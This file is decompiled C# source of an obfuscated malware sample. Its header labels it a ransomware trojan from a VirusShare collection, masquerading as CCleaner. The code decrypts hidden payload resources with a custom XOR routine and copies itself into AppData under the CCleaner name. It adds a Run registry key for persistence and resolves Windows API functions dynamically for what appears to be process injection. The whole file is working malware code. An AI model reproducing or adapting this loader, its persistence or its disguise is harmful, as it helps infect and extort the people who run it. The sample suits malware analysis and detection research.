// Decompiled with JetBrains decompiler
// Type: XgbvJJWlXabVfSl.bSbevZcGNqxJlEpcoxyrEwvscmFmwx
// Assembly: CCleaner, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BD66A744-51D4-4263-B646-6D9E9FC651B3
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\HEUR-Trojan-Ransom.Win32.Generic-c9b14ca3708db4349bf39415bd719f77e4da416306df8a531bfc789deffbd41f.exe

using Microsoft.Win32;
using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace XgbvJJWlXabVfSl
{
  public class bSbevZcGNqxJlEpcoxyrEwvscmFmwx
  {
    private static string[] apPIyCnymELmvRaZCIVEPtsaDEwHcj = new string[1]
    {
      "sBhZnySlzRBfelwOtJnt"
    };
    private static string sQjppjTCfLOOlUEsbDscJXrSIFVPeT = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    public static string[] fFwcmUcgBRfaCjPbiyukDSpZzvzrGJ;

    private static byte[] \u0020(
      byte[] oexmGjrjHJqUbAWItidHwvtTqmqwCQ,
      byte[] uLzSDbCrBFJZRLTJQNdRbtnZmRKDVt)
    {
      byte[] numArray = (byte[]) oexmGjrjHJqUbAWItidHwvtTqmqwCQ.Clone();
      for (int index1 = 0; index1 < 5; ++index1)
      {
        for (int index2 = 0; index2 < numArray.Length; ++index2)
        {
          numArray[index2] = (byte) ((uint) numArray[index2] ^ (uint) uLzSDbCrBFJZRLTJQNdRbtnZmRKDVt[index2 % uLzSDbCrBFJZRLTJQNdRbtnZmRKDVt.Length]);
          for (int index3 = 0; index3 < uLzSDbCrBFJZRLTJQNdRbtnZmRKDVt.Length; ++index3)
            numArray[index2] = (byte) ((uint) numArray[index2] ^ (uint) (((int) uLzSDbCrBFJZRLTJQNdRbtnZmRKDVt[index3] << index1 ^ index3) + index2));
        }
      }
      return numArray;
    }

    public static string \u0020(
      string TTFRpEujXVgcFwXwEIZGuBtKOcxAGL,
      string rYuiMPsZvpoHPiKYMQbOmbDpYrzUcm)
    {
      return Encoding.Default.GetString(bSbevZcGNqxJlEpcoxyrEwvscmFmwx.\u0020(bSbevZcGNqxJlEpcoxyrEwvscmFmwx.\u0020(TTFRpEujXVgcFwXwEIZGuBtKOcxAGL), bSbevZcGNqxJlEpcoxyrEwvscmFmwx.\u0020(rYuiMPsZvpoHPiKYMQbOmbDpYrzUcm)));
    }

    private static byte[] \u0020(string gUBmDhHwKieEmKtNLmaPqHySyptfku) => Encoding.Default.GetBytes(gUBmDhHwKieEmKtNLmaPqHySyptfku);

    private static void \u0020(string[] qxXkitgDDDrqgSKGPTXlEnUnWyuJMp) => bSbevZcGNqxJlEpcoxyrEwvscmFmwx.\u0020();

    public static void \u0020()
    {
      ResourceManager resourceManager = new ResourceManager("lmAsdfVXlRnqdvS", Assembly.GetExecutingAssembly());
      string TTFRpEujXVgcFwXwEIZGuBtKOcxAGL1 = resourceManager.GetString("eDyjSjsf");
      string TTFRpEujXVgcFwXwEIZGuBtKOcxAGL2 = resourceManager.GetString("wnEytfz");
      string TTFRpEujXVgcFwXwEIZGuBtKOcxAGL3 = resourceManager.GetString("QsUZU");
      string TTFRpEujXVgcFwXwEIZGuBtKOcxAGL4 = resourceManager.GetString("ZWwHIw");
      resourceManager.GetString("UPwTyLpjF");
      resourceManager.GetString("QcfKtR");
      string TTFRpEujXVgcFwXwEIZGuBtKOcxAGL5 = resourceManager.GetString("gdfxGDSL");
      string rYuiMPsZvpoHPiKYMQbOmbDpYrzUcm = "$%*!#!#)##&*'&&))'!)))%%&";
      string str = bSbevZcGNqxJlEpcoxyrEwvscmFmwx.\u0020(TTFRpEujXVgcFwXwEIZGuBtKOcxAGL1, rYuiMPsZvpoHPiKYMQbOmbDpYrzUcm);
      bSbevZcGNqxJlEpcoxyrEwvscmFmwx.\u0020(TTFRpEujXVgcFwXwEIZGuBtKOcxAGL2, rYuiMPsZvpoHPiKYMQbOmbDpYrzUcm);
      bSbevZcGNqxJlEpcoxyrEwvscmFmwx.\u0020(TTFRpEujXVgcFwXwEIZGuBtKOcxAGL3, rYuiMPsZvpoHPiKYMQbOmbDpYrzUcm);
      bSbevZcGNqxJlEpcoxyrEwvscmFmwx.\u0020(TTFRpEujXVgcFwXwEIZGuBtKOcxAGL4, rYuiMPsZvpoHPiKYMQbOmbDpYrzUcm);
      bSbevZcGNqxJlEpcoxyrEwvscmFmwx.fFwcmUcgBRfaCjPbiyukDSpZzvzrGJ = bSbevZcGNqxJlEpcoxyrEwvscmFmwx.\u0020(TTFRpEujXVgcFwXwEIZGuBtKOcxAGL5, rYuiMPsZvpoHPiKYMQbOmbDpYrzUcm).Split('|');
      string executablePath = Application.ExecutablePath;
      if (!executablePath.Contains(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)))
      {
        byte[] bytes = File.ReadAllBytes(executablePath);
        string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "CCleaner.exe");
        if (!File.Exists(path))
          File.WriteAllBytes(path, bytes);
      }
      if (str != string.Empty)
      {
        string NNnWCIaGYubbPycihAIIYCjgbXEknD = bSbevZcGNqxJlEpcoxyrEwvscmFmwx.fFwcmUcgBRfaCjPbiyukDSpZzvzrGJ[0];
        foreach (string gUBmDhHwKieEmKtNLmaPqHySyptfku in str.Split(bSbevZcGNqxJlEpcoxyrEwvscmFmwx.apPIyCnymELmvRaZCIVEPtsaDEwHcj, StringSplitOptions.RemoveEmptyEntries))
        {
          try
          {
            psUclhtsaSNIhcmmnPrAcwVuAmXnUg.\u0020(bSbevZcGNqxJlEpcoxyrEwvscmFmwx.\u0020(gUBmDhHwKieEmKtNLmaPqHySyptfku), NNnWCIaGYubbPycihAIIYCjgbXEknD);
          }
          catch
          {
          }
        }
      }
      bSbevZcGNqxJlEpcoxyrEwvscmFmwx.\u0020();
    }

    private static int \u0020(
      int MBmpRFHcBXGiHwxZBGiSyAiZQcDJnJ,
      int ZwRpQPdQbeYNtZDwExOWWOAUPmsnxO)
    {
      return new Random().Next(MBmpRFHcBXGiHwxZBGiSyAiZQcDJnJ, ZwRpQPdQbeYNtZDwExOWWOAUPmsnxO);
    }

    private static void \u0020()
    {
      string name1 = "CCleaner";
      string name2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
      try
      {
        string str = bSbevZcGNqxJlEpcoxyrEwvscmFmwx.sQjppjTCfLOOlUEsbDscJXrSIFVPeT + "\\CCleaner.exe";
        Registry.CurrentUser.OpenSubKey(name2, true).SetValue(name1, (object) str);
      }
      catch
      {
      }
    }

    public static T \u0020<T>(
      string cXORYkqsGIWKEdTLjiuswfVrNlVXyD,
      string wPsmcaYzbshlRgZmjxbddkSftWcxeM)
    {
      return (T) Marshal.GetDelegateForFunctionPointer(psUclhtsaSNIhcmmnPrAcwVuAmXnUg.GetProcAddress(psUclhtsaSNIhcmmnPrAcwVuAmXnUg.LoadLibraryA(cXORYkqsGIWKEdTLjiuswfVrNlVXyD), wPsmcaYzbshlRgZmjxbddkSftWcxeM), typeof (T));
    }

    public delegate IntPtr AniEMDaIVBuctIX(
      IntPtr yPGyLBEpdoZGUNz,
      IntPtr LcHBNtECWLIIIiM,
      uint tnnPDxZRcKalNpL,
      uint axzfYjiyghUnJMc,
      uint TWhrULsekbLlERN);

    public delegate uint kVhzLyIRbXtCetc(IntPtr yPGyLBEpdoZGUNz, IntPtr hRnlKkiCjDmOgII);

    public delegate int DlPnsUWoRMyTibx(
      IntPtr yPGyLBEpdoZGUNz,
      IntPtr hRnlKkiCjDmOgII,
      IntPtr lqeZQdevuZGsqdn,
      uint YCGsadZybSLtXNH,
      IntPtr XmvAQvgEaJcuSld);

    public delegate int mNkQNttvOsSvgHt(IntPtr QRyWEIhNIFlQchf, IntPtr JgIMbuXPnRRXGIX);

    public delegate int bWoSXjnhqcoGqNm(IntPtr QRyWEIhNIFlQchf, IntPtr JgIMbuXPnRRXGIX);

    public delegate uint FzQDKGtoFKlPaTz(IntPtr QRyWEIhNIFlQchf, IntPtr HhnXbTVbiYQyMVE);
  }
}
